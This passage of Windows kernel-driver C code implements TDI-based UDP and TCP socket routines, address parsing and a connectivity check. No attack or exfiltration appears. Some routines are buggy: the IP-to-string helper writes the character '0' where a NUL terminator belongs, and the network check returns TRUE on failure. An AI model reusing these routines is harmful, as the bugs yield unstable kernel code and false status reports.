			{
				ZwClose(s->addressHandle);
			}
		}
	}

	ExFreePool(s);

	return 0;
}

NTSTATUS tdi_disconnect(PFILE_OBJECT connectionFileObject, ULONG flags)
{
	PDEVICE_OBJECT  devObj;
	KEVENT          event;
	PIRP            irp;
	IO_STATUS_BLOCK iosb;
	NTSTATUS        status;

	devObj = IoGetRelatedDeviceObject(connectionFileObject);

	KeInitializeEvent(&event, NotificationEvent, FALSE);

	irp = TdiBuildInternalDeviceControlIrp(TDI_DISCONNECT, devObj, connectionFileObject, &event, &iosb);

	if (irp == NULL)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	TdiBuildDisconnect(irp, devObj, connectionFileObject, NULL, NULL, NULL, flags, NULL, NULL);

	status = IoCallDriver(devObj, irp);

	if (status == STATUS_PENDING)
	{
		KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
		status = iosb.Status;
	}

	return status;
}
NTSTATUS tdi_disassociate_address(PFILE_OBJECT connectionFileObject)
{
	PDEVICE_OBJECT  devObj;
	KEVENT          event;
	PIRP            irp;
	IO_STATUS_BLOCK iosb;
	NTSTATUS        status;

	devObj = IoGetRelatedDeviceObject(connectionFileObject);

	KeInitializeEvent(&event, NotificationEvent, FALSE);

	irp = TdiBuildInternalDeviceControlIrp(TDI_DISASSOCIATE_ADDRESS, devObj, connectionFileObject, &event, &iosb);

	if (irp == NULL)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	TdiBuildDisassociateAddress(irp, devObj, connectionFileObject, NULL, NULL);

	status = IoCallDriver(devObj, irp);

	if (status == STATUS_PENDING)
	{
		KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
		status = iosb.Status;
	}

	return status;
}

NTSTATUS tdi_open_transport_address(PUNICODE_STRING devName, ULONG addr, USHORT port, int shared, PHANDLE addressHandle, PFILE_OBJECT *addressFileObject)
{
	OBJECT_ATTRIBUTES           attr;
	PFILE_FULL_EA_INFORMATION   eaBuffer;
	ULONG                       eaSize;
	PTA_IP_ADDRESS              localAddr;
	IO_STATUS_BLOCK             iosb;
	NTSTATUS                    status;

#if (VER_PRODUCTBUILD >= 2195)
	InitializeObjectAttributes(&attr, devName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
#else
	InitializeObjectAttributes(&attr, devName, OBJ_CASE_INSENSITIVE, NULL, NULL);
#endif

	eaSize = FIELD_OFFSET(FILE_FULL_EA_INFORMATION, EaName[0]) +
		TDI_TRANSPORT_ADDRESS_LENGTH                      +
		1                                                 +
		sizeof(TA_IP_ADDRESS);

	eaBuffer = (PFILE_FULL_EA_INFORMATION) ExAllocatePool(PagedPool, eaSize);

	if (eaBuffer == NULL)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	eaBuffer->NextEntryOffset = 0;
	eaBuffer->Flags = 0;
	eaBuffer->EaNameLength = TDI_TRANSPORT_ADDRESS_LENGTH;
	eaBuffer->EaValueLength = sizeof(TA_IP_ADDRESS);

	RtlCopyMemory(eaBuffer->EaName, TdiTransportAddress, eaBuffer->EaNameLength + 1);

	localAddr = (PTA_IP_ADDRESS)(eaBuffer->EaName + eaBuffer->EaNameLength + 1);

	localAddr->TAAddressCount = 1;
	localAddr->Address[0].AddressLength = TDI_ADDRESS_LENGTH_IP;
	localAddr->Address[0].AddressType = TDI_ADDRESS_TYPE_IP;
	localAddr->Address[0].Address[0].sin_port = port;
	localAddr->Address[0].Address[0].in_addr = addr;

	RtlZeroMemory(localAddr->Address[0].Address[0].sin_zero, sizeof(localAddr->Address[0].Address[0].sin_zero));

	status = ZwCreateFile(
		addressHandle,
		GENERIC_READ | GENERIC_WRITE,
		&attr,
		&iosb,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		shared ? FILE_SHARE_READ | FILE_SHARE_WRITE : 0,
		FILE_OPEN,
		0,
		eaBuffer,
		eaSize
		);

	ExFreePool(eaBuffer);

	if (!NT_SUCCESS(status))
	{
		return status;
	}

	status = ObReferenceObjectByHandle(*addressHandle, FILE_ALL_ACCESS, NULL, KernelMode, (PVOID *)addressFileObject, NULL);

	if (!NT_SUCCESS(status))
	{
		ZwClose(*addressHandle);
		return status;
	}

	return STATUS_SUCCESS;
}

int __cdecl mysendto(int socket, char *buf, int len, int flags, sockaddr_in *addr, int addrlen)
{
	PSOCKET s = (PSOCKET)-socket;
	sockaddr_in* remoteAddr = (sockaddr_in*)addr;
	//sockaddr_in localAddr;

	/*
	if (s->type == SOCK_STREAM)
	{
	return send(socket, buf, len, flags);
	}
	*/
	// else 
	if (s->type == SOCK_DGRAM)
	{
		if (addr == NULL || addrlen < sizeof(sockaddr_in))
		{
			return -1;
		}

		if (!s->isBound)
		{
			sockaddr_in localAddr;
			NTSTATUS status;  //定义在前面

			localAddr.sin_family = AF_INET;//2
			localAddr.sin_port = 0;
			localAddr.sin_addr.s_addr = ReadHostIPsFromRegistry();

			status = bind(socket, (sockaddr_in *) &localAddr, sizeof(localAddr));

			if (!NT_SUCCESS(status))
			{
				return status;
			}
		}

		return tdi_send_dgram(
			s->addressFileObject,
			remoteAddr->sin_addr.s_addr,
			remoteAddr->sin_port,
			buf,
			len);
	}
	else
	{
		return -1;
	}
}

NTSTATUS tdi_send_dgram(PFILE_OBJECT addressFileObject, ULONG addr, USHORT port, const char *buf, int len)
{
	PDEVICE_OBJECT              devObj;
	KEVENT                      event;
	PTDI_CONNECTION_INFORMATION remoteInfo;
	PTA_IP_ADDRESS              remoteAddr;
	PIRP                        irp;
	PMDL                        mdl;
	IO_STATUS_BLOCK             iosb;
	NTSTATUS                    status;

	devObj = IoGetRelatedDeviceObject(addressFileObject);

	KeInitializeEvent(&event, NotificationEvent, FALSE);

	remoteInfo = (PTDI_CONNECTION_INFORMATION) ExAllocatePool(NonPagedPool, sizeof(TDI_CONNECTION_INFORMATION) + sizeof(TA_IP_ADDRESS));

	if (remoteInfo == NULL)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	RtlZeroMemory(remoteInfo, sizeof(TDI_CONNECTION_INFORMATION) + sizeof(TA_IP_ADDRESS));

	remoteInfo->RemoteAddressLength = sizeof(TA_IP_ADDRESS);
	remoteInfo->RemoteAddress = (PUCHAR)remoteInfo + sizeof(TDI_CONNECTION_INFORMATION);

	remoteAddr = (PTA_IP_ADDRESS) remoteInfo->RemoteAddress;

	remoteAddr->TAAddressCount = 1;
	remoteAddr->Address[0].AddressLength = TDI_ADDRESS_LENGTH_IP;
	remoteAddr->Address[0].AddressType = TDI_ADDRESS_TYPE_IP;
	remoteAddr->Address[0].Address[0].sin_port = port;
	remoteAddr->Address[0].Address[0].in_addr = addr;

	irp = TdiBuildInternalDeviceControlIrp(TDI_SEND_DATAGRAM, devObj, addressFileObject, &event, &iosb);

	if (irp == NULL)
	{
		ExFreePool(remoteInfo);
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	if (len)
	{
		mdl = IoAllocateMdl((void*) buf, len, FALSE, FALSE, NULL);

		if (mdl == NULL)
		{
			IoFreeIrp(irp);
			ExFreePool(remoteInfo);
			return STATUS_INSUFFICIENT_RESOURCES;
		}

		__try
		{
			MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
			status = STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			IoFreeMdl(mdl);
			IoFreeIrp(irp);
			ExFreePool(remoteInfo);
			status = STATUS_INVALID_USER_BUFFER;
		}

		if (!NT_SUCCESS(status))
		{
			return status;
		}
	}

	TdiBuildSendDatagram(irp, devObj, addressFileObject, NULL, NULL, len ? mdl : 0, len, remoteInfo);

	status = IoCallDriver(devObj, irp);

	if (status == STATUS_PENDING)
	{
		KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
		status = iosb.Status;
	}

	ExFreePool(remoteInfo);

	return NT_SUCCESS(status) ? iosb.Information : status;
}


char* myinet_ntoa(in_addr InAddr)
{
	PUCHAR p;
	PUCHAR pBuffer;
	PUCHAR b;

	pBuffer = NULL;

	do 
	{
		pBuffer = (PUCHAR)KernelMalloc(20);
	} while (NULL == pBuffer);
	RtlZeroMemory(pBuffer,20);
	// A number of applications apparently depend on calling inet_ntoa()
	// without first calling WSAStartup(). Because of this, we must perform
	// our own explicit thread initialization check here.
	b = pBuffer;
	// In an unrolled loop, calculate the string value for each of the four
	// bytes in an IP address.  Note that for values less than 100 we will
	// do one or two extra assignments, but we save a test/jump with this
	// algorithm.
	p = (PUCHAR)&InAddr;
	*b = MyNToACharStrings[*p][0];
	*(b+1) = MyNToACharStrings[*p][1];
	*(b+2) = MyNToACharStrings[*p][2];
	b += MyNToACharStrings[*p][3];
	*b++ = '.';
	p++;
	*b = MyNToACharStrings[*p][0];
	*(b+1) = MyNToACharStrings[*p][1];
	*(b+2) = MyNToACharStrings[*p][2];
	b += MyNToACharStrings[*p][3];
	*b++ = '.';
	p++;
	*b = MyNToACharStrings[*p][0];
	*(b+1) = MyNToACharStrings[*p][1];
	*(b+2) = MyNToACharStrings[*p][2];
	b += MyNToACharStrings[*p][3];
	*b++ = '.';
	p++;
	*b = MyNToACharStrings[*p][0];
	*(b+1) = MyNToACharStrings[*p][1];
	*(b+2) = MyNToACharStrings[*p][2];
	b += MyNToACharStrings[*p][3];
	*b = '0';
	DbgPrint("buffer %s\n",pBuffer);
	return (char*)pBuffer;
}

/*
* Internet address interpretation routine.
* All the network library routines call this
* routine to interpret entries in the data bases
* which are expected to be an address.
* The value returned is in network order.
*/
unsigned long 
myinet_addr(
			IN const char *cp
			)
{
	register unsigned long val, base, n;
	register char c;
	unsigned long parts[4], *pp = parts;

	// WS_ENTER( "inet_addr", (PVOID)cp, NULL, NULL, NULL );
again:
	/*
	* Collect number up to ``.''.
	* Values are specified as for C:
	* 0x=hex, 0=octal, other=decimal.
	*/
	val = 0; base = 10;
	if (*cp == '0') {
		base = 8, cp++;
		if (*cp == 'x' || *cp == 'X')
			base = 16, cp++;
	}

	while (c = *cp) {
		if (isdigit(c)) {
			val = (val * base) + (c - '0');
			cp++;
			continue;
		}
		if (base == 16 && isxdigit(c)) {
			val = (val << 4) + (c + 10 - (islower(c) ? 'a' : 'A'));
			cp++;
			continue;
		}
		break;
	}
	if (*cp == '.') {
		/*
		* Internet format:
		*      a.b.c.d
		*      a.b.c   (with c treated as 16-bits)
		*      a.b     (with b treated as 24 bits)
		*/
		/* GSS - next line was corrected on 8/5/89, was 'parts + 4' */
		if (pp >= parts + 3) {
			//WS_EXIT( "inet_addr", -1, TRUE );
			return ((unsigned long) -1);
		}
		*pp++ = val, cp++;
		goto again;
	}
	/*
	* Check for trailing characters.
	*/
	if (*cp && !isspace(*cp)) {
		// WS_EXIT( "inet_addr", -1, TRUE );
		return (INADDR_NONE);
	}
	*pp++ = val;
	/*
	* Concoct the address according to
	* the number of parts specified.
	*/
	n = (unsigned long)(pp - parts);
	switch ((int) n) {

		case 1:                         /* a -- 32 bits */
			val = parts[0];
			break;

		case 2:                         /* a.b -- 8.24 bits */
			if ((parts[0] > 0xff) || (parts[1] > 0xffffff)) {
				//WS_EXIT( "inet_addr", -1, TRUE );
				return(INADDR_NONE);
			}
			val = (parts[0] << 24) | (parts[1] & 0xffffff);
			break;

		case 3:                         /* a.b.c -- 8.8.16 bits */
			if ((parts[0] > 0xff) || (parts[1] > 0xff) ||
				(parts[2] > 0xffff)) {
					//WS_EXIT( "inet_addr", -1, TRUE );
					return(INADDR_NONE);
			}
			val = (parts[0] << 24) | ((parts[1] & 0xff) << 16) |
				(parts[2] & 0xffff);
			break;

		case 4:                         /* a.b.c.d -- 8.8.8.8 bits */
			if ((parts[0] > 0xff) || (parts[1] > 0xff) ||
				(parts[2] > 0xff) || (parts[3] > 0xff)) {
					// WS_EXIT( "inet_addr", -1, TRUE );
					return(INADDR_NONE);
			}
			val = (parts[0] << 24) | ((parts[1] & 0xff) << 16) |
				((parts[2] & 0xff) << 8) | (parts[3] & 0xff);
			break;

		default:
			//WS_EXIT( "inet_addr", -1, TRUE );
			return (INADDR_NONE);
	}
	val = htonl(val);
	// WS_EXIT( "inet_addr", val, FALSE );
	return (val);
}

int __cdecl socket(int af, int type, int protocol)
{
	PSOCKET s;

	if (af != AF_INET ||
		(type != SOCK_DGRAM && type != SOCK_STREAM) ||
		(type == SOCK_DGRAM && protocol != IPPROTO_UDP && protocol != 0) ||
		(type == SOCK_STREAM && protocol != IPPROTO_TCP && protocol != 0)
		)
	{
		return STATUS_INVALID_PARAMETER;
	}

	s = (PSOCKET) ExAllocatePool(NonPagedPool, sizeof(SOCKET));

	if (!s)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	RtlZeroMemory(s, sizeof(SOCKET));

	s->type = type;
	s->addressHandle = (HANDLE) -1;
	//自己添加一行
	s->isBound = FALSE;
	return -(int)s;
}



int __cdecl recvfrom(int socket, char *buf, int len, int flags, sockaddr_in *addr, int *addrlen)
{
	PSOCKET s = (PSOCKET) -socket;
	sockaddr_in* returnAddr = (sockaddr_in*) addr;
	/*	
	if (s->type == SOCK_STREAM)
	{
	return recv(socket, buf, len, flags);
	}
	*/
	//    else
	if (s->type == SOCK_DGRAM)
	{
		u_long* sin_addr = 0;
		u_short* sin_port = 0;

		if (!s->isBound)
		{
			return -1;
		}

		if (addr != NULL && addrlen != NULL && *addrlen >= sizeof(sockaddr_in))
		{
			sin_addr = &returnAddr->sin_addr.s_addr;
			sin_port = &returnAddr->sin_port;
			*addrlen = sizeof(sockaddr_in);
		}

		return tdi_recv_dgram(
			s->addressFileObject,
			sin_addr,
			sin_port,
			buf,
			len,
			TDI_RECEIVE_NORMAL
			);
	}
	else
	{
		return -1;
	}
}

NTSTATUS tdi_recv_dgram(PFILE_OBJECT addressFileObject, PULONG addr, PUSHORT port, char *buf, int len, ULONG flags)
{
	PDEVICE_OBJECT              devObj;
	KEVENT                      event;
	PTDI_CONNECTION_INFORMATION remoteInfo;
	PTDI_CONNECTION_INFORMATION returnInfo;
	PTA_IP_ADDRESS              returnAddr;
	PIRP                        irp;
	PMDL                        mdl;
	IO_STATUS_BLOCK             iosb;
	NTSTATUS                    status;

	devObj = IoGetRelatedDeviceObject(addressFileObject);

	KeInitializeEvent(&event, NotificationEvent, FALSE);

	remoteInfo = (PTDI_CONNECTION_INFORMATION) ExAllocatePool(NonPagedPool, 2 * sizeof(TDI_CONNECTION_INFORMATION) + sizeof(TA_IP_ADDRESS));

	if (remoteInfo == NULL)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	RtlZeroMemory(remoteInfo, 2 * sizeof(TDI_CONNECTION_INFORMATION) + sizeof(TA_IP_ADDRESS));

	remoteInfo->RemoteAddressLength = 0;
	remoteInfo->RemoteAddress = NULL;

	returnInfo = (PTDI_CONNECTION_INFORMATION)((PUCHAR)remoteInfo + sizeof(TDI_CONNECTION_INFORMATION));

	returnInfo->RemoteAddressLength = sizeof(TA_IP_ADDRESS);
	returnInfo->RemoteAddress = (PUCHAR)returnInfo + sizeof(TDI_CONNECTION_INFORMATION);

	returnAddr = (PTA_IP_ADDRESS) returnInfo->RemoteAddress;

	returnAddr->TAAddressCount = 1;
	returnAddr->Address[0].AddressLength = TDI_ADDRESS_LENGTH_IP;
	returnAddr->Address[0].AddressType = TDI_ADDRESS_TYPE_IP;

	irp = TdiBuildInternalDeviceControlIrp(TDI_RECEIVE_DATAGRAM, devObj, addressFileObject, &event, &iosb);

	if (irp == NULL)
	{
		ExFreePool(remoteInfo);
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	if (len)
	{
		mdl = IoAllocateMdl((void*) buf, len, FALSE, FALSE, NULL);

		if (mdl == NULL)
		{
			IoFreeIrp(irp);
			ExFreePool(remoteInfo);
			return STATUS_INSUFFICIENT_RESOURCES;
		}

		__try
		{
			MmProbeAndLockPages(mdl, KernelMode, IoWriteAccess);
			status = STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			IoFreeMdl(mdl);
			IoFreeIrp(irp);
			ExFreePool(remoteInfo);
			status = STATUS_INVALID_USER_BUFFER;
		}

		if (!NT_SUCCESS(status))
		{
			return status;
		}
	}

	TdiBuildReceiveDatagram(irp, devObj, addressFileObject, NULL, NULL, len ? mdl : 0, len, remoteInfo, returnInfo, flags);

	status = IoCallDriver(devObj, irp);

	if (status == STATUS_PENDING)
	{
		KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
		status = iosb.Status;
	}

	if (addr)
	{
		*addr = returnAddr->Address[0].Address[0].in_addr;
	}

	if (port)
	{
		*port = returnAddr->Address[0].Address[0].sin_port;
	}

	ExFreePool(remoteInfo);

	return NT_SUCCESS(status) ? iosb.Information : status;
}
BOOLEAN NetWorkIsOk(ULONG ulRemoteAddress,USHORT uRemotePort)
{
	BOOLEAN bRet;
	NTSTATUS Status;
	PFILE_OBJECT pConnectionFileObject;
	PFILE_OBJECT pAddressFileObject;
	HANDLE hAddressHandle,hConnectionHandle;

	pConnectionFileObject = NULL;
	pAddressFileObject = NULL;
	hAddressHandle = NULL;
	hConnectionHandle = NULL;
	Status = STATUS_SUCCESS;
	bRet = FALSE;

	do 
	{
		Status = CreateAddress(&hAddressHandle,&pAddressFileObject);
		if (NT_ERROR(Status)) 
		{   
			break;
		}
		Status = CreateConnection(&hConnectionHandle,&pConnectionFileObject);
		if (NT_ERROR(Status)) 
		{
			break;
		}
		Status = Bind(pConnectionFileObject,hAddressHandle);
		if (NT_ERROR(Status)) 
		{
			break;
		}
		Status = Connect(pConnectionFileObject,ulRemoteAddress,uRemotePort);
		if (NT_ERROR(Status))
		{
			break;
		}
		bRet = TRUE;
		Status = DisConnect(pConnectionFileObject); 
		if (NT_ERROR(Status))
		{
			break;
		}
	} while (0);
	if (pConnectionFileObject)
	{
		ObDereferenceObject(pConnectionFileObject);
	}
	if (pAddressFileObject)
	{
		ObDereferenceObject(pAddressFileObject);
	}
	if (hConnectionHandle)
	{
		ZwClose(hConnectionHandle);
	}
	if (hAddressHandle)
	{
		ZwClose(hAddressHandle);
	}
	return TRUE;
}
NTSTATUS CreateConnection(PHANDLE pHandle,PFILE_OBJECT *pFileObject)
{ 
	IO_STATUS_BLOCK IoStatus; 
	NTSTATUS Status;
	UNICODE_STRING UniDeviceName; 
	OBJECT_ATTRIBUTES ObjectAttributes;
	char Buffer[sizeof(FILE_FULL_EA_INFORMATION) + TDI_CONNECTION_CONTEXT_LENGTH + 300] = {0};
	PFILE_FULL_EA_INFORMATION Ea ;

	Status = STATUS_SUCCESS;
	Ea = NULL;

	RtlInitUnicodeString(&UniDeviceName,L"\\Device\\Tcp"); 
	InitializeObjectAttributes(&ObjectAttributes,&UniDeviceName,OBJ_CASE_INSENSITIVE,0,0); 

	Ea = (PFILE_FULL_EA_INFORMATION)&Buffer;
	RtlCopyMemory(Ea->EaName, TdiConnectionContext, TDI_CONNECTION_CONTEXT_LENGTH);
	Ea->EaNameLength = TDI_CONNECTION_CONTEXT_LENGTH; 
	Ea->EaValueLength =TDI_CONNECTION_CONTEXT_LENGTH; 


	Status= ZwCreateFile(pHandle, 
		GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, 
		&ObjectAttributes, 
		&IoStatus, 
		0, 
		FILE_ATTRIBUTE_NORMAL, 
		FILE_SHARE_READ, 
		FILE_OPEN, 
		0, 
		Ea, 
		sizeof(Buffer)); 
	if (NT_ERROR(Status)) 
	{
		DbgPrint("ZwCreateFile return failed!!\n");
		return Status; 
	}
	return ObReferenceObjectByHandle(*pHandle,GENERIC_READ | GENERIC_WRITE,0,KernelMode,(PVOID *)pFileObject,0);
}
NTSTATUS CreateAddress(PHANDLE pHandle,PFILE_OBJECT *ppFileObject)
{ 
	UNICODE_STRING UniDeviceName;
	OBJECT_ATTRIBUTES ObjectAttributes;
	CHAR Buffer[sizeof (FILE_FULL_EA_INFORMATION) + TDI_TRANSPORT_ADDRESS_LENGTH + sizeof (TA_IP_ADDRESS)];
	PFILE_FULL_EA_INFORMATION Ea;
	IO_STATUS_BLOCK IoStatus;
	NTSTATUS Status ;
	PTA_IP_ADDRESS Sin;
	// DbgPrint(" hi in cretaaddress\n");
	RtlInitUnicodeString(&UniDeviceName,L"\\Device\\Tcp"); 
	InitializeObjectAttributes(&ObjectAttributes,&UniDeviceName,OBJ_CASE_INSENSITIVE,0,0); 

	Ea = (PFILE_FULL_EA_INFORMATION)Buffer; 
	Ea->NextEntryOffset = 0; 
	Ea->Flags = 0; 
	Ea->EaNameLength = TDI_TRANSPORT_ADDRESS_LENGTH; 
	Ea->EaValueLength = sizeof (TA_IP_ADDRESS); 
	RtlCopyMemory(Ea->EaName,TdiTransportAddress,Ea->EaNameLength + 1); 

	Sin = (PTA_IP_ADDRESS)(Ea->EaName + Ea->EaNameLength + 1); 
	Sin->TAAddressCount = 1; 
	Sin->Address[0].AddressLength = TDI_ADDRESS_LENGTH_IP; 
	Sin->Address[0].AddressType = TDI_ADDRESS_TYPE_IP; 
	Sin->Address[0].Address[0].sin_port = 0; 
	Sin->Address[0].Address[0].in_addr = 0; 
	RtlZeroMemory(Sin->Address[0].Address[0].sin_zero,sizeof(Sin->Address[0].Address[0].sin_zero)); 

	Status = ZwCreateFile(pHandle, 
		0, 
		&ObjectAttributes, 
		&IoStatus, 
		0, 
		FILE_ATTRIBUTE_NORMAL, 
		0, 
		FILE_OPEN, 
		0, 
		Ea, 
		sizeof(Buffer)); 
	if (NT_ERROR(Status))
	{
		DbgPrint("CreateAddress->ZwCreateFile return failed!!\n");
		return Status; 
	}
	return ObReferenceObjectByHandle(*pHandle,GENERIC_READ | GENERIC_WRITE,0,KernelMode,(PVOID *)ppFileObject,0);
}
NTSTATUS Bind(PFILE_OBJECT pFileObject,HANDLE Address)
{ 
	KEVENT Event; 
	PDEVICE_OBJECT pDeviceObject;
	IO_STATUS_BLOCK IoStatus;
	PIRP pIrp ;
	NTSTATUS Status;
	// Define a completion event

	pDeviceObject = NULL;
	pIrp = NULL;
	Status = STATUS_SUCCESS;

	KeInitializeEvent(&Event,NotificationEvent,FALSE); 
	pDeviceObject = IoGetRelatedDeviceObject(pFileObject); 
	pIrp = TdiBuildInternalDeviceControlIrp(TDI_ASSOCIATE_ADDRESS,pDeviceObject,pFileObject,&Event,&IoStatus); 
	/*
	TdiBuildAssociateAddress sets IRP_MJ_INTERNAL_DEVICE_CONTROL as the MajorFunction and TDI_ASSOCIATE_ADDRESS 
	as the MinorFunction codes in the transport's I/O stack location of the given IRP.*/
	if (pIrp == 0)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	TdiBuildAssociateAddress(pIrp,pDeviceObject,pFileObject,0,0,Address); 
	Status = IoCallDriver(pDeviceObject,pIrp); 
	if (Status == STATUS_PENDING)
	{
		Status = KeWaitForSingleObject(&Event,UserRequest,KernelMode,FALSE,0);
	}
	return Status == STATUS_SUCCESS ? IoStatus.Status : Status; 
}
NTSTATUS Connect(PFILE_OBJECT pFileObject,ULONG ulAddr,USHORT uPort)
{ 
	KEVENT Event; 
	PDEVICE_OBJECT pDeviceObject;
	IO_STATUS_BLOCK IoStatus; 
	PIRP pIrp;
	TA_IP_ADDRESS RemoteAddr;
	TDI_CONNECTION_INFORMATION RequestInfo;
	//PTDI_ADDRESS_IP pTdiAddressIp;
	NTSTATUS Status;


	KeInitializeEvent(&Event,NotificationEvent,FALSE); 
	pDeviceObject = IoGetRelatedDeviceObject(pFileObject); 
	//// build connection packet
	pIrp = TdiBuildInternalDeviceControlIrp(TDI_CONNECT,pDeviceObject,pFileObject,&Event,&IoStatus); 
	if (pIrp == 0)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	// Initialize controller data
	RemoteAddr.TAAddressCount = 1;
	RemoteAddr.Address[0].AddressLength = TDI_ADDRESS_LENGTH_IP;
	RemoteAddr.Address[0].AddressType = TDI_ADDRESS_TYPE_IP;
	/* pTdiAddressIp = (TDI_ADDRESS_IP *)RemoteAddr.Address[0].Address;
	pTdiAddressIp->sin_port=Port;
	pTdiAddressIp->in_addr=Addr;*/
	RemoteAddr.Address[0].Address[0].sin_port = uPort;
	RemoteAddr.Address[0].Address[0].in_addr = ulAddr;

	RequestInfo.Options = 0;
	RequestInfo.OptionsLength = 0;
	RequestInfo.UserData = 0;
	RequestInfo.UserDataLength = 0;
	RequestInfo.RemoteAddress = &RemoteAddr;
	RequestInfo.RemoteAddressLength = sizeof(RemoteAddr);
	TdiBuildConnect(pIrp,pDeviceObject,pFileObject,0,0,0,&RequestInfo,0);
	Status = IoCallDriver(pDeviceObject,pIrp); 
	if (Status == STATUS_PENDING)
	{
		Status = KeWaitForSingleObject(&Event,UserRequest,KernelMode,FALSE,0);
	}
	return Status == STATUS_SUCCESS ? IoStatus.Status : Status;
}
NTSTATUS DisConnect(PFILE_OBJECT pFileObject)
{ 
	KEVENT Event;
	NTSTATUS Status;
	PDEVICE_OBJECT pDeviceObject;
	IO_STATUS_BLOCK IoStatus; 
	PIRP pIrp;

	Status = STATUS_SUCCESS;
	pIrp = NULL;
	pDeviceObject = NULL;

	KeInitializeEvent(&Event,NotificationEvent,FALSE); 
	pDeviceObject = IoGetRelatedDeviceObject(pFileObject); 
	pIrp = TdiBuildInternalDeviceControlIrp(TDI_DISCONNECT,pDeviceObject,pFileObject,&Event,&IoStatus); 
	if (pIrp == 0)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	TdiBuildDisconnect(pIrp,pDeviceObject,pFileObject,0,0,0,TDI_DISCONNECT_RELEASE,0,0); 
	Status = IoCallDriver(pDeviceObject,pIrp); 
	if (Status == STATUS_PENDING)
	{
		Status = KeWaitForSingleObject(&Event,UserRequest,KernelMode,FALSE,0);
	}
	return Status == STATUS_SUCCESS ? IoStatus.Status : Status; 
}

NTSTATUS Send(PFILE_OBJECT pFileObject,PVOID pData,ULONG ulLength) 
{ 
	KEVENT Event; 
	PDEVICE_OBJECT pDeviceObject ;
	IO_STATUS_BLOCK IoStatus; 
	PIRP pIrp;
	PMDL pMdl;
	NTSTATUS Status;

	Status = STATUS_SUCCESS;
	pIrp = NULL;
	pDeviceObject = NULL;
	pMdl = NULL;

	KeInitializeEvent(&Event,NotificationEvent,FALSE); 
	//The TDI Device Object is required to send these requests to the TDI Driver.
	pDeviceObject = IoGetRelatedDeviceObject(pFileObject); 
	pIrp = TdiBuildInternalDeviceControlIrp(TDI_SEND,pDeviceObject,pFileObject,&Event,&IoStatus); 
	if (pIrp == NULL) 
	{
		return STATUS_INSUFFICIENT_RESOURCES; 
	}
	pMdl = IoAllocateMdl(pData,ulLength,FALSE,FALSE,pIrp); 
	if (pMdl == 0)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	__try 
	{ 
		MmProbeAndLockPages(pMdl,KernelMode,IoModifyAccess);
	}
	__except(EXCEPTION_EXECUTE_HANDLER) 
	{ 
		IoFreeMdl(pMdl); 
		pMdl = NULL;
	}
	TdiBuildSend(pIrp,pDeviceObject,pFileObject,0,0,pMdl,0,ulLength); 
	Status = IoCallDriver(pDeviceObject,pIrp); 
	/* If the status returned is STATUS_PENDING this means that the IRP will not be completed synchronously 
	and the driver has queued the IRP for later processing. This is fine but we do not want to return this 
	not want to return this not want to return this to wait until it has completed. The EVENT that we 
	providedwill be set when the IRP completes. */ 
	if (Status == STATUS_PENDING)
	{
		Status = KeWaitForSingleObject(&Event,UserRequest,KernelMode,FALSE,0); 
	}
	return Status == STATUS_SUCCESS ? IoStatus.Status : Status; 
}
NTSTATUS RecvData(PFILE_OBJECT pConnectionFileObject,PCHAR pbuf,int nLen,ULONG ulFlags)
{
	PDEVICE_OBJECT pDeviceObject;
	KEVENT event;
	PIRP pIrp;
	PMDL pMdl;
	IO_STATUS_BLOCK IoStatusBlock;
	NTSTATUS Status;

	Status = STATUS_SUCCESS;
	pIrp = NULL;
	pDeviceObject = NULL;
	pMdl = NULL;

	pDeviceObject = IoGetRelatedDeviceObject(pConnectionFileObject);
	KeInitializeEvent(&event,NotificationEvent,FALSE);
	pIrp = TdiBuildInternalDeviceControlIrp(TDI_RECEIVE,pDeviceObject,pConnectionFileObject,&event,&IoStatusBlock);
	if (pIrp == NULL)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	if (nLen)
	{
		pMdl = IoAllocateMdl((void*)pbuf,nLen,FALSE,FALSE,NULL);

		if (pMdl == NULL)
		{
			IoFreeIrp(pIrp);
			return STATUS_INSUFFICIENT_RESOURCES;
		}
		__try
		{
			MmProbeAndLockPages(pMdl,KernelMode,IoWriteAccess);
			Status = STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			IoFreeMdl(pMdl);
			IoFreeIrp(pIrp);
			Status = STATUS_INVALID_USER_BUFFER;
		}
		if (!NT_SUCCESS(Status))
		{
			return Status;
		}
	}
	TdiBuildReceive(pIrp,pDeviceObject,pConnectionFileObject,NULL,NULL,nLen ? pMdl : 0,ulFlags,nLen);
	Status = IoCallDriver(pDeviceObject,pIrp);
	if (Status == STATUS_PENDING)
	{
		KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
		Status = IoStatusBlock.Status;
	}
	return NT_SUCCESS(Status) ? IoStatusBlock.Information : Status;
}
NTSTATUS CheckFileSize(PUNICODE_STRING pUnFileName,ULONG ulSize)
{
	NTSTATUS status;
	HANDLE hFile;
	OBJECT_ATTRIBUTES objectattributes;
	IO_STATUS_BLOCK iostatus;
	PVOID pFileInformation;
	LARGE_INTEGER lgFileEnd;

	InitializeObjectAttributes(&objectattributes,pUnFileName,OBJ_CASE_INSENSITIVE,NULL,NULL);
	status = ZwCreateFile(&hFile,
		GENERIC_ALL,
		&objectattributes,
		&iostatus,
		NULL,
